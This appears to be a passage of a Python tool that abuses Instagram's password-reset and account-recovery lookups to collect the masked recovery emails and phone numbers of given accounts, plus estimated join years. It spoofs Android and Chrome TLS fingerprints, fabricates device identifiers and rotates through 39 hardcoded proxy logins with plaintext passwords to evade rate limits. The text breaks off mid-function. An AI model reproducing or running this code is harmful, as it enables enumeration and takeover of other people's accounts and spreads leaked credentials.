import hashlib
import platform
import uuid
import re
import secrets
import shutil
import requests
import threading
import time
import sys
import os
import html
import json
import base64
import hmac
import queue
import random
from concurrent.futures import ThreadPoolExecutor, TimeoutError as FuturesTimeoutError, as_completed
from datetime import datetime, timezone, timedelta
from urllib.parse import quote, urlparse
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Hit MORE: wbloks recovery (test.run_recovery) + legacy graphql helpers kept for other paths
# HTTP chain for profile/posts: curl_cffi → tls_client → requests
# tls_client .so often missing on Termux; curl_cffi chrome131_android works when installed.
_curl_cffi_mod = None
_HIT_LOOKUP_HAS_CURL = False
_HIT_CURL_LABEL = ""
_tls_client_mod = None
_HIT_LOOKUP_HAS_TLS = False
_HIT_TLS_LABEL = ""
# Termux/mobile: Android TLS only — do not fall back to desktop chrome impersonate.
_CURL_IMPERSONATE_MOBILE = ("chrome131_android", "chrome99_android")
_CURL_IMPERSONATE_DESKTOP = ("chrome131", "chrome124", "chrome120")
_TLS_MOBILE_IDS = ("okhttp4_android_13", "okhttp4_android_12", "okhttp4_android_11")
_TLS_DESKTOP_IDS = ("chrome_120", "chrome_110", "okhttp4_android_13")


def _tls_blocked_platform() -> bool:
    # TERMUX_VERSION only — folder check false-positives on Linux hosts.
    return bool(os.environ.get("TERMUX_VERSION"))


def _is_mobile_hit_http() -> bool:
    if os.environ.get("TERMUX_VERSION"):
        return True
    return "com.termux" in os.environ.get("PREFIX", "")


def _bootstrap_curl_cffi() -> None:
    """curl_cffi — Chrome/Android TLS fingerprint; best Termux option when wheel exists."""
    global _curl_cffi_mod, _HIT_LOOKUP_HAS_CURL, _HIT_CURL_LABEL
    try:
        from curl_cffi import requests as curl_requests
    except ImportError:
        _curl_cffi_mod = None
        _HIT_LOOKUP_HAS_CURL = False
        _HIT_CURL_LABEL = ""
        return
    pool = _CURL_IMPERSONATE_MOBILE if _is_mobile_hit_http() else _CURL_IMPERSONATE_DESKTOP
    for imp in pool:
        try:
            probe = curl_requests.Session(impersonate=imp)
            del probe
            _curl_cffi_mod = curl_requests
            _HIT_LOOKUP_HAS_CURL = True
            _HIT_CURL_LABEL = imp
            return
        except Exception:
            continue
    _curl_cffi_mod = None
    _HIT_LOOKUP_HAS_CURL = False
    _HIT_CURL_LABEL = ""


def hit_http_stack_label() -> str:
    """Active profile-fetch HTTP stack (for logs / system check)."""
    if _HIT_LOOKUP_HAS_CURL and _HIT_CURL_LABEL:
        return f"curl_cffi/{_HIT_CURL_LABEL}"
    if _HIT_LOOKUP_HAS_TLS and _HIT_TLS_LABEL:
        return f"tls_client/{_HIT_TLS_LABEL}"
    return "requests"


def _bootstrap_tls_client() -> None:
    """tls_client OkHttp fingerprint — desktop only; broken .so on Termux."""
    global _tls_client_mod, _HIT_LOOKUP_HAS_TLS, _HIT_TLS_LABEL
    if _is_mobile_hit_http():
        return
    pool = _TLS_MOBILE_IDS if _is_mobile_hit_http() else _TLS_DESKTOP_IDS
    try:
        import tls_client as tc
    except ImportError:
        _tls_client_mod = None
        _HIT_LOOKUP_HAS_TLS = False
        _HIT_TLS_LABEL = ""
        return
    for cid in pool:
        try:
            probe = tc.Session(client_identifier=cid, random_tls_extension_order=True)
            del probe
            _tls_client_mod = tc
            _HIT_LOOKUP_HAS_TLS = True
            _HIT_TLS_LABEL = cid
            return
        except Exception:
            continue
    _tls_client_mod = None
    _HIT_LOOKUP_HAS_TLS = False
    _HIT_TLS_LABEL = ""


def _bootstrap_hit_http() -> None:
    _bootstrap_curl_cffi()
    _bootstrap_tls_client()


_bootstrap_hit_http_lock = threading.Lock()
_bootstrap_hit_http_done = False


def _ensure_hit_http_bootstrapped() -> None:
    """Lazy TLS stack probe — avoids blocking joint.py import on curl_cffi/tls_client."""
    global _bootstrap_hit_http_done
    if _bootstrap_hit_http_done:
        return
    with _bootstrap_hit_http_lock:
        if _bootstrap_hit_http_done:
            return
        _bootstrap_hit_http()
        _bootstrap_hit_http_done = True


def _new_hit_http_session() -> tuple[object, str]:
    _ensure_hit_http_bootstrapped()
    """(session, backend) — backend: curl_cffi | tls_client | requests."""
    if _HIT_LOOKUP_HAS_CURL and _curl_cffi_mod is not None and _HIT_CURL_LABEL:
        try:
            return _curl_cffi_mod.Session(impersonate=_HIT_CURL_LABEL), "curl_cffi"
        except Exception:
            pass
    if _HIT_LOOKUP_HAS_TLS and _tls_client_mod is not None:
        try:
            return _tls_client_mod.Session(
                client_identifier=_HIT_TLS_LABEL or "okhttp4_android_13",
                random_tls_extension_order=True,
            ), "tls_client"
        except Exception:
            pass
    return requests.Session(), "requests"


def _new_hit_tls_session() -> tuple[object, bool]:
    """Legacy (session, is_tls_client) — profile code uses _new_hit_http_session."""
    http, backend = _new_hit_http_session()
    return http, backend == "tls_client"


def _hit_http_post(
    http, backend, url, *, data, headers, timeout: int = 30, proxies=None,
):
    hdrs = dict(headers or {})
    if backend == "tls_client":
        try:
            return http.post(
                url, data=data, headers=hdrs, timeout_seconds=timeout, proxies=proxies,
            )
        except TypeError:
            pass
    return http.post(url, data=data, headers=hdrs, timeout=timeout, proxies=proxies)


def _hit_http_get(
    http, backend, url, *, params=None, headers=None, timeout: int = 20, proxies=None,
):
    hdrs = dict(headers or {})
    if backend == "tls_client":
        try:
            return http.get(
                url, params=params, headers=hdrs, timeout_seconds=timeout, proxies=proxies,
            )
        except TypeError:
            pass
    return http.get(url, params=params, headers=hdrs, timeout=timeout, proxies=proxies)


# ═══ Hit enrich proxies (hardcoded — recovery / posts / profile only) ═══
# Not shipped as proxy_live.txt — baked into encrypted release.
# 39 proxies · hunt gen uses direct IP only
_HIT_PROXIES_RAW = (
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@pt-lis.pvdata.host:8080",
    "hughmuir2:lisamarie11@us6.cactussstp.com:81",
    "bvmbsmie:shibby2511@nl3.cactussstp.com:8080",
    "yefprelf:dr2gsmab@nl3.cactussstp.com:8080",
    "uncpjndo:w77Ebc0h2A@nl3.cactussstp.com:81",
    "bvmbsmie:shibby2511@us6.cactussstp.com:81",
    "uncpjndo:w77Ebc0h2A@nl3.cactussstp.com:3129",
    "nngone:Oe2933Oe@nl3.cactussstp.com:3129",
    "hughmuir2:lisamarie11@nl3.cactussstp.com:81",
    "bvmbsmie:shibby2511@nl3.cactussstp.com:3129",
    "yefprelf:dr2gsmab@nl3.cactussstp.com:3129",
    "bvmbsmie:shibby2511@nl3.cactussstp.com:81",
    "hughmuir2:lisamarie11@nl3.cactussstp.com:8080",
    "nngone:Oe2933Oe@nl3.cactussstp.com:81",
    "uncpjndo:w77Ebc0h2A@nl3.cactussstp.com:8080",
    "hughmuir2:lisamarie11@nl3.cactussstp.com:3129",
    "yefprelf:dr2gsmab@nl3.cactussstp.com:81",
    "uncpjndo:w77Ebc0h2A@us6.cactussstp.com:81",
    "nngone:Oe2933Oe@us6.cactussstp.com:81",
    "bvmbsmie:shibby2511@us6.cactussstp.com:8080",
    "hughmuir2:lisamarie11@us6.cactussstp.com:8080",
    "uncpjndo:w77Ebc0h2A@us6.cactussstp.com:3129",
    "nngone:Oe2933Oe@nl3.cactussstp.com:8080",
    "hughmuir2:lisamarie11@us6.cactussstp.com:3129",
    "nngone:Oe2933Oe@us6.cactussstp.com:3129",
    "bvmbsmie:shibby2511@us6.cactussstp.com:3129",
    "nngone:Oe2933Oe@us6.cactussstp.com:8080",
    "uncpjndo:w77Ebc0h2A@us6.cactussstp.com:8080",
    "uncpjndo:w77Ebc0h2A@us3.cactussstp.com:3129",
    "uncpjndo:w77Ebc0h2A@us3.cactussstp.com:81",
    "uncpjndo:w77Ebc0h2A@us3.cactussstp.com:8080",
    "bvmbsmie:shibby2511@us3.cactussstp.com:8080",
    "nngone:Oe2933Oe@us3.cactussstp.com:81",
    "bvmbsmie:shibby2511@us3.cactussstp.com:3129",
    "nngone:Oe2933Oe@us3.cactussstp.com:8080",
    "hughmuir2:lisamarie11@us3.cactussstp.com:8080",
    "hughmuir2:lisamarie11@us3.cactussstp.com:81",
    "bvmbsmie:shibby2511@us3.cactussstp.com:81",
    "hughmuir2:lisamarie11@us3.cactussstp.com:3129",
)
_hit_proxy_pool = None
_hit_proxy_pool_lock = threading.Lock()

def _parse_hit_proxy_line(line):
    raw = (line or "").strip()
    if not raw or raw.startswith("#"):
        return None
    if "@" in raw:
        creds, hostport = raw.rsplit("@", 1)
        if ":" not in creds or ":" not in hostport:
            return None
        username, password = creds.split(":", 1)
        host, port = hostport.rsplit(":", 1)
    else:
        parts = raw.split(":")
        if len(parts) < 4:
            return None
        host, port, username, *rest = parts
        password = ":".join(rest)
    if not all((host, port, username, password)):
        return None
    proxy_url = f"http://{username}:{password}@{host}:{port}"
    return {
        "http": proxy_url,
        "https": proxy_url,
        "raw": raw,
        "label": f"{host}:{port}",
    }


def _hit_proxy_for_requests(entry):
    if not entry:
        return None
    return {"http": entry["http"], "https": entry["https"]}


class _HitProxyPool:
    _STRIKE_LIMIT = 1

    def __init__(self, proxies):
        self._proxies = list(proxies)
        random.shuffle(self._proxies)
        self._idx = 0
        self._strikes = {}
        self._lock = threading.Lock()

    def __len__(self):
        return len(self._proxies)

    def mark_bad_requests(self, proxies):
        if not proxies:
            return
        bad = proxies.get("https") or proxies.get("http")
        if not bad:
            return
        with self._lock:
            self._strikes[bad] = self._strikes.get(bad, 0) + 1
            if self._strikes[bad] < self._STRIKE_LIMIT:
                return
            self._proxies = [
                p for p in self._proxies if (p.get("https") or p.get("http")) != bad
            ]
            self._strikes.pop(bad, None)
            if self._idx >= len(self._proxies):
                self._idx = 0

    def next_requests(self):
        with self._lock:
            if not self._proxies:
                return None
            entry = self._proxies[self._idx % len(self._proxies)]
            self._idx += 1
            return _hit_proxy_for_requests(entry)


def _load_hit_proxy_pool():
    entries = []
    for line in _HIT_PROXIES_RAW:
        entry = _parse_hit_proxy_line(line)
        if entry:
            entries.append(entry)
    return _HitProxyPool(entries)


def get_hit_proxy_pool():
    global _hit_proxy_pool
    with _hit_proxy_pool_lock:
        if _hit_proxy_pool is None:
            _hit_proxy_pool = _load_hit_proxy_pool()
        return _hit_proxy_pool


def hit_proxy_next():
    pool = get_hit_proxy_pool()
    if not pool:
        return None
    return pool.next_requests()


def hit_proxy_mark_bad(proxies):
    pool = get_hit_proxy_pool()
    if pool:
        pool.mark_bad_requests(proxies)


def _hit_proxy_attempts(*, proxy_tries=None, direct_first=True):
    """Own IP first, then hardcoded hit proxies — recovery/posts/profile only."""
    if direct_first:
        yield None
    pool = get_hit_proxy_pool()
    if not pool or len(pool) <= 0:
        if not direct_first:
            yield None
        return
    tries = max(1, int(proxy_tries if proxy_tries is not None else _HIT_RECOVERY_PROXY_TRIES))
    for _ in range(tries):
        proxies = pool.next_requests()
        if proxies:
            yield proxies
    if not direct_first:
        yield None


def _hit_http_status_proxy_retry(status):
    return int(status or 0) in (429, 502, 503, 504)



def _hit_proxy_retry_pause(attempt_idx):
    if attempt_idx <= 0:
        return
    if _IS_TERMUX:
        time.sleep(0.35 + random.uniform(0.15, 0.55))
    else:
        time.sleep(0.12 + random.uniform(0.05, 0.25))


_HIT_PROXY_TRIES = 10
_HIT_LOOKUP_RETRIES = 10
_HIT_LOOKUP_RETRY_DELAY = 2.5
_HIT_CONTACT_ENRICH_RETRIES = 1
_HIT_RECOVERY_PROXY_TRIES = 10
_HIT_PFP_DOWNLOAD_RETRIES = 6
_HIT_PFP_REFRESH_ROUNDS = 4
_HIT_POSTS_FETCH_RETRIES = 10
_HIT_POSTS_FETCH_ROUNDS = 3
_HIT_GRAPHQL_DOC_ID = "35299094813070532"
_HIT_RECOVERY_WEB_URL = (
    "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"
)
_HIT_RECOVERY_RESET_URL = "https://www.instagram.com/accounts/password/reset/"
_HIT_LOOKUP_MOBILE_APP_ID = "567067343352427"
_HIT_LOOKUP_BLOKS_VERSION = (
    "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
)
_HIT_LOOKUP_PROFILE_URL = "https://i.instagram.com/api/v1/users/web_profile_info/"
_HIT_LOOKUP_BLOKS_URL = (
    "https://i.instagram.com/api/v1/bloks/async_action/"
    "com.bloks.www.caa.ar.search.async/"
)
_HIT_LOOKUP_MOBILE_UA = (
    "Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; "
    "samsung; SM-A235F; a23; qcom; en_IN; 704872281)"
)
_HIT_LOOKUP_PHONE_RE = re.compile(r"\+\d{1,4}(?:\s\*+)+[\d* ]+\d{2}")
_HIT_LOOKUP_EMAIL_RE = re.compile(
    r"[a-zA-Z0-9][a-zA-Z0-9*._-]*\*+[a-zA-Z0-9*._-]*@[a-zA-Z0-9*._-]+\.[a-zA-Z]{2,}"
)
_HIT_LOOKUP_NO_ACCOUNT_RE = re.compile(
    r"no account found|couldn.?t find|user not found|doesn.?t match",
    re.IGNORECASE,
)
_HIT_PROFILE_MEDIA_EDGE_RE = re.compile(
    r'"edge_owner_to_timeline_media"\s*:\s*\{\s*"count"\s*:\s*(\d+)',
)
_HIT_PROFILE_MEDIA_COUNT_RE = re.compile(r'"media_count"\s*:\s*(\d+)', re.I)
_HIT_PROFILE_POSTS_COUNT_RE = re.compile(r'"posts_count"\s*:\s*(\d+)', re.I)
_HIT_FULL_EMAIL_RE = re.compile(
    r"^[a-zA-Z0-9][a-zA-Z0-9._-]{2,}@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$",
    re.IGNORECASE,
)
_HIT_FULL_GMAIL_RE = re.compile(
    r"^[a-zA-Z0-9][a-zA-Z0-9._-]{2,}@gmail\.com$",
    re.IGNORECASE,
)
_HIT_BODY_EMAIL_RE = re.compile(
    r"[a-zA-Z0-9][a-zA-Z0-9._-]{2,}@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
    re.IGNORECASE,
)
_HIT_BODY_GMAIL_RE = re.compile(
    r"[a-zA-Z0-9][a-zA-Z0-9._-]{2,}@gmail\.com",
    re.IGNORECASE,
)
_HIT_MASKED_GMAIL_RE = re.compile(r"@gmail\.com\s*$", re.IGNORECASE)
_HIT_SENT_CODE_RE = re.compile(
    r"sent a code to ([a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})",
    re.IGNORECASE,
)

_hit_proxy_boot_logged = False
_hits_file_lock = threading.Lock()
HITS_DIR = "hits"
_session_hits_file = None
_next_worker_id = 0
_worker_id_lock = threading.Lock()


class HitRecoveryResult:
    __slots__ = (
        "query", "found", "username", "email", "phone",
        "account_created", "contact_points", "error", "error_kind",
    )

    def __init__(
        self,
        query,
        found=False,
        username=None,
        email=None,
        phone=None,
        account_created=None,
        contact_points=None,
        error=None,
        error_kind=None,
    ):
        self.query = query
        self.found = found
        self.username = username
        self.email = email
        self.phone = phone
        self.account_created = account_created
        self.contact_points = contact_points or []
        self.error = error
        self.error_kind = error_kind


def _estimate_join_year_from_user_id(user_id):
    """Estimate account join year from Instagram numeric user id (pk)."""
    try:
        uid = int(user_id)
    except (TypeError, ValueError):
        return None
    if uid <= 1:
        return None
    if uid < 1_279_000:
        return "~2010"
    if uid <= 17_750_000:
        return "~2011"
    if uid <= 279_760_000:
        return "~2012"
    if uid <= 900_990_000:
        return "~2013"
    if uid <= 1_629_010_000:
        return "~2014"
    if uid <= 2_369_359_761:
        return "~2015"
    if uid <= 4_239_516_754:
        return "~2016"
    if uid <= 6_345_108_209:
        return "~2017"
    if uid <= 10_016_232_395:
        return "~2018"
    if uid <= 27_238_602_159:
        return "~2019"
    if uid <= 43_464_475_395:
        return "~2020"
    if uid <= 50_289_297_647:
        return "~2021"
    if uid <= 57_464_707_082:
        return "~2022"
    if uid <= 63_313_426_938:
        return "~2023"
    return "~2024+"


def _unescape_ig_json_string(value):
    if not value:
        return ""
    try:
        return json.loads(f'"{value}"')
    except Exception:
        return value.replace("\\/", "/").replace('\\"', '"')


def _is_valid_ig_recovery_phone(value):
    """Only IG-masked recovery phones — never raw digit strings."""
    v = (value or "").strip()
    if not v or not v.startswith("+"):
        return False
    if "*" not in v and "•" not in v:
        return False
    return bool(_HIT_LOOKUP_PHONE_RE.search(v))


def _is_valid_ig_recovery_email(value):
    v = (value or "").strip().lower()
    if not v or "@" not in v:
        return False
    if "*" in v or "•" in v:
        return bool(_HIT_LOOKUP_EMAIL_RE.search(v))
    return bool(_HIT_FULL_EMAIL_RE.match(v))


def _filter_valid_contact_points(points):
    out = []
    for cp in points or []:
        if not isinstance(cp, dict):
            continue
        kind = (cp.get("type") or "").upper()
        val = (cp.get("contact_point") or cp.get("value") or "").strip()
        if not val:
            continue
        if kind == "EMAIL" and not _is_valid_ig_recovery_email(val):
            continue
        if kind == "PHONE" and not _is_valid_ig_recovery_phone(val):
            continue
        out.append({"type": kind, "contact_point": val})
    return out


def _extract_json_contact_points(body):
    """Parse embedded contact_points from bloks / graphql JSON blobs."""
    if not body:
        return []
    points = []
    seen = set()
    patterns = (
        re.compile(
            r'"type"\s*:\s*"(EMAIL|PHONE)"\s*,\s*"contact_point"\s*:\s*"((?:\\.|[^"\\])*)"',
            re.IGNORECASE,
        ),
        re.compile(
            r'"contact_point"\s*:\s*"((?:\\.|[^"\\])*)"\s*,\s*"type"\s*:\s*"(EMAIL|PHONE)"',
            re.IGNORECASE,
        ),
    )
    for pat in patterns:
        for match in pat.finditer(body):
            if pat is patterns[0]:
                kind, raw_val = match.group(1), match.group(2)
            else:
                raw_val, kind = match.group(1), match.group(2)
            val = _unescape_ig_json_string(raw_val).strip()
            kind = (kind or "").upper()
            if not val or kind not in {"EMAIL", "PHONE"}:
                continue
            key = (kind, val)
            if key in seen:
                continue
            seen.add(key)
            points.append({"type": kind, "contact_point": val})
    return points


def _hit_result_from_contact_points(query, contact_points):
    points = _filter_valid_contact_points(contact_points)
    email, phone = _pick_ig_contact_points(points)
    if not (email or phone):
        return None
    return HitRecoveryResult(
        query=query,
        found=True,
        username=query,
        email=email or None,
        phone=phone or None,
        contact_points=points,
    )


def _recovery_error_retryable(result):
    kind = getattr(result, "error_kind", None)
    if kind == "not_found":
        return False
    if kind == "no_contact":
        return True
    return kind in (
        "rate_limited", "server", "network", "bootstrap", "upstream", "http_error",
    )


def _recovery_proxy_bad(result):
    """Drop proxy from pool on transport/upstream failures."""
    kind = getattr(result, "error_kind", None)
    return kind in ("network", "upstream", "bootstrap", "http_error")


def _bootstrap_ig_recovery_web_session(sess, proxies=None):
    """Fresh IG web session for password-reset search (rotating proxy)."""
    ua = (
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
    )
    try:
        resp = sess.get(
            _HIT_RECOVERY_RESET_URL,
            headers={"User-Agent": ua, "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8"},
            timeout=15,
            proxies=proxies,
        )
    except requests.RequestException:
        return "", ""
    html = resp.text or ""
    lsd_m = re.search(r'"LSD",\[\],\{"token":"([^"]+)"', html)
    lsd = (lsd_m.group(1) if lsd_m else "").strip()
    csrftoken = (sess.cookies.get("csrftoken") or "").strip()
    did_m = re.search(r'"device_id":"([^"]+)"', html)
    if did_m and not sess.cookies.get("ig_did"):
        sess.cookies.set("ig_did", did_m.group(1), domain=".instagram.com")
    if not sess.cookies.get("datr"):
        sess.cookies.set("datr", secrets.token_urlsafe(12), domain=".instagram.com")
    return csrftoken, lsd


def _graphql_recovery_lookup_once(query, proxies=None, *, timeout=20):
    """Single GraphQL attempt — IG password reset page (masked email/phone)."""
    sess = requests.Session()
    csrftoken, lsd = _bootstrap_ig_recovery_web_session(sess, proxies)
    if not csrftoken or not lsd:
        return HitRecoveryResult(
            query=query, found=False, error="Session bootstrap failed", error_kind="bootstrap"
        )
    variables = json.dumps({
        "params": {
            "event_request_id": str(uuid.uuid4()),
            "next_uri": "",
            "search_query": query,
            "waterfall_id": str(uuid.uuid4()),
        }
    }, separators=(",", ":"))
    payload = {
        "av": "0",
        "__d": "www",
        "__user": "0",
        "__a": "1",
        "__req": "8",
        "dpr": "1",
        "__ccg": "GOOD",
        "__comet_req": "7",
        "__crn": "comet.igweb.PolarisCAAIGAccountRecoverySearchRoute",
        "qpl_active_flow_ids": "516759801",
        "fb_api_caller_class": "RelayModern",
        "fb_api_req_friendly_name": "CAAIGAccountSearchViewQuery",
        "server_timestamps": "true",
        "doc_id": _HIT_GRAPHQL_DOC_ID,
        "variables": variables,
        "jazoest": str(random.randint(20000, 29999)),
        "lsd": lsd,
    }
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
        ),
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-CSRFToken": csrftoken,
        "X-IG-App-ID": "936619743392459",
        "X-FB-Friendly-Name": "CAAIGAccountSearchViewQuery",
        "X-ASBD-ID": "359341",
        "X-FB-LSD": lsd,
        "Origin": "https://www.instagram.com",
        "Referer": _HIT_RECOVERY_RESET_URL,
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
    }
    try:
        resp = sess.post(
            "https://www.instagram.com/api/graphql",
            data=payload,
            headers=headers,
            timeout=timeout,
            proxies=proxies,
        )
        if resp.status_code in (429, 502, 503, 504):
            return HitRecoveryResult(
                query=query, found=False, error="Instagram busy", error_kind="upstream"
        )
        if resp.status_code != 200:
            return HitRecoveryResult(
                query=query, found=False, error=f"HTTP {resp.status_code}", error_kind="http_error"
            )
        body = resp.text or ""
        if body.startswith("for (;;);"):
            body = body[9:]
        if _HIT_LOOKUP_NO_ACCOUNT_RE.search(body):
            return HitRecoveryResult(
                query=query, found=False, error="No account found", error_kind="not_found"
            )
        if "Something went wrong" in body or "Please try again later" in body:
            return HitRecoveryResult(
                query=query, found=False, error="Instagram busy", error_kind="rate_limited"
            )
        if '"error":' in body and '"contact_points"' not in body:
            return HitRecoveryResult(
                query=query, found=False, error="Instagram busy", error_kind="rate_limited"
            )
        points = []
        try:
            data = json.loads(body)
            search = (data.get("data") or {}).get("caa_ar_ig_account_search") or {}
            points = search.get("contact_points") or []
        except (ValueError, TypeError, AttributeError):
            points = []
        if not points:
            points = _extract_json_contact_points(body)
        parsed = _hit_result_from_contact_points(query, points)
        if parsed:
            return parsed
        return HitRecoveryResult(
            query=query, found=False, error="No contact info", error_kind="no_contact"
        )
    except Exception:
        return HitRecoveryResult(
            query=query, found=False, error="Connection error", error_kind="network"
        )


def _graphql_recovery_lookup(
    query,
    *,
    proxy_tries=None,
    http_timeout=20,
    direct_first=True,
    max_wall_sec=None,
):
    """Web GraphQL — own IP first, proxies only on retryable failure."""
    query = (query or "").strip().lstrip("@")
    if not query:
        return HitRecoveryResult(query=query, found=False, error="Empty query")
    deadline = (time.monotonic() + float(max_wall_sec)) if max_wall_sec else None
    last = None
    for attempt, proxies in enumerate(
        _hit_proxy_attempts(proxy_tries=proxy_tries, direct_first=direct_first)
    ):
        if deadline and time.monotonic() >= deadline:
            break
        _hit_proxy_retry_pause(attempt)
        req_timeout = http_timeout
        if deadline:
            req_timeout = min(http_timeout, max(3, int(deadline - time.monotonic())))
        result = _graphql_recovery_lookup_once(query, proxies, timeout=req_timeout)
        last = result
        if result.found:
            return result
        if result.error_kind == "not_found":
            return result
        if not _recovery_error_retryable(result):
            return result
        if proxies and (
            _recovery_proxy_bad(result)
            or getattr(result, "error_kind", None) in ("network", "bootstrap", "http_error", "upstream")
        ):
            hit_proxy_mark_bad(proxies)
    return last or HitRecoveryResult(
        query=query, found=False, error="Instagram busy", error_kind="rate_limited"
    )


def _graphql_recovery_lookup_fast(query, *, max_wall_sec=None):
    """Own IP once → up to 10 proxy retries; bad proxies removed from pool."""
    return _graphql_recovery_lookup(
        query,
        proxy_tries=_HIT_RECOVERY_PROXY_TRIES,
        http_timeout=_HIT_GRAPHQL_FAST_HTTP_TIMEOUT,
        direct_first=True,
        max_wall_sec=max_wall_sec,
        )


def _hit_lookup_parse_bloks(query, body):
    if _HIT_LOOKUP_NO_ACCOUNT_RE.search(body):
        return HitRecoveryResult(
            query=query, found=False, error="No account found", error_kind="not_found"
        )
    if "challenge_required" in body or "checkpoint_required" in body:
        return HitRecoveryResult(
            query=query, found=False, error="Challenge required", error_kind="server"
        )
    if "Something went wrong" in body or "Please try again later" in body:
        return HitRecoveryResult(
            query=query, found=False, error="Instagram busy", error_kind="rate_limited"
        )
    sent = _HIT_SENT_CODE_RE.search(body or "")
    contact_points = _filter_valid_contact_points(_extract_json_contact_points(body))
    if sent:
        email = sent.group(1).strip().lower()
        if _is_valid_ig_recovery_email(email):
            contact_points.insert(0, {"type": "EMAIL", "contact_point": email})
    if not contact_points:
        emails = [
            e.lower()
            for e in dict.fromkeys(_HIT_LOOKUP_EMAIL_RE.findall(body or ""))
            if _is_valid_ig_recovery_email(e)
        ]
        emails.extend(
            e.lower()
            for e in dict.fromkeys(_HIT_BODY_EMAIL_RE.findall(body or ""))
            if _is_valid_ig_recovery_email(e)
        )
        phones = [
            p
            for p in dict.fromkeys(_HIT_LOOKUP_PHONE_RE.findall(body or ""))
            if _is_valid_ig_recovery_phone(p)
        ]
    for value in phones:
        contact_points.append({"type": "PHONE", "contact_point": value})
    for value in dict.fromkeys(emails):
        contact_points.append({"type": "EMAIL", "contact_point": value})
    if not contact_points:
        if len(body) < 8000:
            return HitRecoveryResult(
                query=query, found=False, error="No account found", error_kind="not_found"
            )
        return HitRecoveryResult(
            query=query, found=False, error="Instagram busy", error_kind="rate_limited"
        )
    parsed = _hit_result_from_contact_points(query, contact_points)
    if parsed:
        return parsed
    return HitRecoveryResult(
        query=query, found=False, error="No contact info", error_kind="not_found"
    )


class InstagramRecoveryLookup:
    """Mobile IG account-recovery search — inlined for hit MORE section."""

    def __init__(self, session=None):
        self.session = session or requests.Session()
        self._init_mobile_http()

    def _init_mobile_http(self):
        self._mobile_http, self._mobile_http_backend = _new_hit_http_session()

    def _mobile_post(self, url, data, headers):
        hdrs = {"User-Agent": _HIT_LOOKUP_MOBILE_UA, **headers}
        last_exc = None
        for attempt, proxies in enumerate(_hit_proxy_attempts()):
            _hit_proxy_retry_pause(attempt)
            try:
                resp = _hit_http_post(
                    self._mobile_http, self._mobile_http_backend, url,
                    data=data, headers=hdrs, timeout=30, proxies=proxies,
                )
                status = getattr(resp, "status_code", 0) if resp is not None else 0
                if _hit_http_status_proxy_retry(status):
                    if proxies:
                        hit_proxy_mark_bad(proxies)
                    continue
                return resp
            except Exception as exc:
                last_exc = exc
                if proxies:
                    hit_proxy_mark_bad(proxies)
                continue
        if last_exc:
            raise last_exc
        return None

    def _mobile_get(self, url, *, params=None, headers=None, timeout=20):
        hdrs = {"User-Agent": _HIT_LOOKUP_MOBILE_UA, **(headers or {})}
        last_exc = None
        for attempt, proxies in enumerate(_hit_proxy_attempts()):
            _hit_proxy_retry_pause(attempt)
            try:
                resp = _hit_http_get(
                    self._mobile_http, self._mobile_http_backend, url,
                    params=params, headers=hdrs, timeout=timeout, proxies=proxies,
                )
                status = getattr(resp, "status_code", 0) if resp is not None else 0
                if _hit_http_status_proxy_retry(status):
                    if proxies:
                        hit_proxy_mark_bad(proxies)
                    continue
                return resp
            except Exception as exc:
                last_exc = exc
                if proxies:
                    hit_proxy_mark_bad(proxies)
                continue
        if last_exc:
            raise last_exc
        return None

    def _fetch_user_id(self, username):
        for app_id in (_HIT_LOOKUP_MOBILE_APP_ID, "936619743392459"):
            try:
                resp = self._mobile_get(
                    _HIT_LOOKUP_PROFILE_URL,
                    params={"username": username},
                    headers={"X-IG-App-ID": app_id},
                )
                if resp.status_code != 200:
                    continue
                user = (resp.json().get("data") or {}).get("user") or {}
                user_id = str(user.get("id") or user.get("pk") or "") or None
                if user_id:
                    return user_id
            except (requests.RequestException, ValueError, TypeError, AttributeError):
                continue
        return None

    def _enrich(self, result):
        username = result.username or result.query
        if not username:
            return result
        time.sleep(random.uniform(0.3, 0.8))
        user_id = self._fetch_user_id(username)
        if user_id:
            result.account_created = _estimate_join_year_from_user_id(user_id)
        return result

    def _lookup_mobile_once(self, query):
        device_id = str(uuid.uuid4())
        family_id = str(uuid.uuid4())
        android_id = "android-" + secrets.token_hex(8)
        tz = datetime.now(timezone.utc).astimezone().utcoffset()
        tz_sec = int(tz.total_seconds()) if tz else 0
        client_params = {
            "aac": json.dumps(
                {
                    "aac_init_timestamp": int(time.time()),
                    "aacjid": str(uuid.uuid4()),
                    "aaccs": secrets.token_urlsafe(32),
                },
                separators=(",", ":"),
            ),
            "flash_call_permissions_status": {
                "READ_PHONE_STATE": "PERMANENTLY_DENIED",
                "READ_CALL_LOG": "DENIED",
                "ANSWER_PHONE_CALLS": "DENIED",
            },
            "was_headers_prefill_available": 0,
            "search_query": query,
            "search_screen_type": "email_or_username",
            "android_build_type": "release",
            "is_whatsapp_installed": 1,
            "ig_android_qe_device_id": device_id,
        }
        server_params = {
            "event_request_id": str(uuid.uuid4()),
            "device_id": android_id,
            "waterfall_id": str(uuid.uuid4()),
            "family_device_id": family_id,
            "qe_device_id": device_id,
            "is_from_logged_out": 0,
            "login_entry_point": "logged_out",
        }
        payload = {
            "params": json.dumps(
                {"client_input_params": client_params, "server_params": server_params},
                separators=(",", ":"),
            ),
            "bk_client_context": json.dumps(
                {"bloks_version": _HIT_LOOKUP_BLOKS_VERSION, "styles_id": "instagram"},
                separators=(",", ":"),
            ),
            "bloks_versioning_id": _HIT_LOOKUP_BLOKS_VERSION,
        }
        headers = {
            "User-Agent": _HIT_LOOKUP_MOBILE_UA,
            "Accept-Language": "en-IN, en-US",
